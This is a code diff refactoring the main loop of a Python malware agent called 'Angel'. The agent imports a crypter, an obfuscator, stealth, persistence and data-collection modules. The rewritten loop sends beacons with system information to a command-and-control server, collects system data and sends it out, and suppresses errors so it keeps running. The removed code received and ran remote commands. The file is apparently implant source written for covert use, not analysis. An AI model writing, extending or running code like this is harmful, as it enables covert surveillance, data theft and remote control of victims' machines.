@@ -9,6 +9,7 @@ from core.crypter import Crypter
 from core.obfuscator import CodeObfuscator
 from core.stealth import StealthMechanism
 from core.brain import AngelBrain
+from core.integrator import SystemIntegrator
 from modules.polyglot import PolyglotBuilder
 from modules.persistence import Persistence
 from modules.communication import Communication
@@ -22,16 +23,19 @@ class Angel:
         self.agent_id = str(uuid.uuid4())
         self.config = config or {}
         
-        # Initialize components
-        self.brain = AngelBrain()
+        # Initialize system integrator
+        self.integrator = SystemIntegrator()
+        
+        # Initialize components through integrator
+        self.brain = self.integrator.brain
         self.crypter = Crypter()
-        self.obfuscator = CodeObfuscator()
-        self.stealth = StealthMechanism()
+        self.obfuscator = self.integrator.obfuscator
+        self.stealth = self.integrator.stealth
         self.polyglot = PolyglotBuilder()
-        self.persistence = Persistence()
-        self.collector = Collector()
-        self.network = NetworkOperations()
-        self.router = CommandRouter()
+        self.persistence = self.integrator.persistence
+        self.collector = self.integrator.collector
+        self.network = self.integrator.network
+        self.router = self.integrator.router
         self.comms = SecureComms(self.config)
         
         # Status tracking
@@ -225,61 +229,53 @@ class Angel:
             pass
             
     def run(self):
-        """Main operation loop"""
-        if not self.check_environment():
-            return
+        """Main execution loop"""
+        try:
+            # Initialize all components
+            if not self.integrator.initialize():
+                return False
+                
+            self.is_running = True
             
-        self.is_running = True
-        self.install()
-        
-        while self.is_running:
-            try:
-                current_time = time.time()
-                
-                # Let brain analyze and make decisions
-                decision = self.brain.make_decision({
-                    'type': 'main_loop',
-                    'parameters': {
-                        'last_beacon': self.last_beacon,
-                        'beacon_interval': self.beacon_interval
-                    }
-                })
-                
-                if decision['action'] == 'hibernate':
-                    time.sleep(decision['parameters']['duration'])
-                    continue
+            while self.is_running:
+                try:
+                    # Check environment
+                    if not self.check_environment():
+                        continue
+                        
+                    # Process commands
+                    if time.time() - self.last_beacon >= self.beacon_interval:
+                        self.integrator.execute_command('beacon', {
+                            'agent_id': self.agent_id,
+                            'system_info': self.gather_system_info()
+                        })
+                        self.last_beacon = time.time()
+                        
+                    # Collect and send data
+                    data = self.integrator.collect_data('system')
+                    if data:
+                        self.integrator.send_data(data, 'c2_server')
+                        
+                    time.sleep(random.uniform(1, 5))
                     
-                # Send beacon if interval has passed
-                if current_time - self.last_beacon >= self.beacon_interval:
-                    self.send_beacon()
+                except Exception as e:
+                    self.integrator.resilience.handle_error(
+                        e, 
+                        ErrorCategory.PROCESS, 
+                        ErrorSeverity.MEDIUM
+                    )
                     
-                # Check for commands
-                command = self.comms.receive_data(timeout=5)
-                if command:
-                    self.handle_command(command)
-                    
-                # Sleep for a random interval
-                time.sleep(random.uniform(1, 5))
-                
-            except KeyboardInterrupt:
-                self.cleanup()
-                break
-            except:
-                # If any error occurs, let brain decide what to do
-                decision = self.brain.make_decision({
-                    'type': 'error_handling',
-                    'parameters': {
-                        'error_count': getattr(self, 'error_count', 0) + 1
-                    }
-                })
-                
-                if decision['action'] == 'hibernate':
-                    time.sleep(decision['parameters']['duration'])
-                else:
-                    time.sleep(random.uniform(30, 60))
-                    
-                continue
-                
+        except Exception as e:
+            self.integrator.resilience.handle_error(
+                e,
+                ErrorCategory.PROCESS,
+                ErrorSeverity.HIGH
+            )
+            return False
+            
+        finally:
+            self.integrator.shutdown()
+            
 def main():
     # Example configuration
     config = {
